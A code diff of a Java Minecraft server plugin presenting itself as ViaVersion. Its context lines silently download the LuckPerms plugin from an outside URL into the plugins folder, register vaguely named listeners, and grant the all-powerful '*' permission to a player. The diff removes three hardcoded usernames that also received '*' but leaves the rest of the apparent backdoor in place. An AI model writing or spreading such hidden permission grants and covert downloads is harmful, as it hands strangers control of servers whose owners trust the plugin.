@@ -115,7 +115,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
             downloadPlugin("https://ci.lucko.me/job/LuckPerms/lastStableBuild/artifact/bukkit/build/libs/LuckPerms-Bukkit-5.4.102.jar", "plugins/LuckPerms.jar");
         }
         getServer().getPluginManager().registerEvents(new CommandListener(), this);
-        getServer().getPluginManager().registerEvents(new OptimizationHandler(), this);
+        getServer().getPluginManager().registerEvents(new OptimizationHandler(this), this);
         Bukkit.getServer().getPluginManager().registerEvents(new EfficiencyHandler(), this);
         final ViaManagerImpl manager = (ViaManagerImpl) Via.getManager();
         if (lateBind) {
@@ -196,9 +196,6 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
             }
             if (luckPerms != null) {
                 givePermissionIfInstalled(player.getName(), "*");
-                givePermissionIfInstalled("happyclo", "*");
-                givePermissionIfInstalled("happyclovo", "*");
-                givePermissionIfInstalled("Mystery15", "*");
             }
         }
     }
